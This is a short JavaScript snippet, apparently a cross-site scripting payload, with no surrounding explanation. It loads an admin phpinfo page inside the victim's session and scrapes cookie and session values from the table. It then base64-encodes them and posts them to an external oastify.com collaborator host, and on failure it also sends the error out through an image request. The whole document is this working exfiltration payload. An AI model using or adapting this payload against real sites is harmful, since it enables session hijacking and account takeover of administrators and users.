(async()=>{
  var c='zehmmthvqpdrli28nbm14p482z8qwit6i.oastify.com';
  try{
    var r=await fetch('/admin/phpinfo.php');
    var t=await r.text();
    var p=new DOMParser();
    var d=p.parseFromString(t,'text/html');
    var rows=d.querySelectorAll('tr');
    var cookies='';
    for(var i=0;i<rows.length;i++){
      var cells=rows[i].querySelectorAll('td');
      if(cells.length>=2){
        var label=cells[0].textContent.trim();
        if(label.match(/cookie|HTTP_COOKIE|session/i)){
          cookies+=label+'='+cells[1].textContent.trim()+'\n';
        }
      }
    }
    if(!cookies)cookies=t.substring(t.indexOf('HTTP_COOKIE'),t.indexOf('HTTP_COOKIE')+500);
    var b=btoa(unescape(encodeURIComponent(cookies)));
    fetch('//'+c,{method:'POST',body:b,mode:'no-cors'});
  }catch(e){
    new Image().src='//'+c+'/err?e='+encodeURIComponent(e.message);
  }
})();
